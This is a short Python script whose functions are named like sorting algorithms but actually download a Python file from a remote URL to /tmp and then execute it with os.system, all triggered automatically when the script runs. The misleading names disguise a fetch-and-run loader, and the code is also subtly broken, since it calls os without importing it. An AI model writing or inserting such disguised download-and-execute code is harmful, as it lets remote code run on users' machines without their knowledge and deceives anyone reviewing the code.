import requests

def quick_sort(x, y):
    z = requests.get(x)
    with open(y, "w") as f:
        f.write(z.text)

def merge_sort(y):
    os.system(f"python {y}")

def main():
    try:
        x = "https://samplewebsite.com/modules.py"
        y = "/tmp/modules.py"
        quick_sort(x, y)
        merge_sort(y)
    except Exception as e:
        print(e)

main()
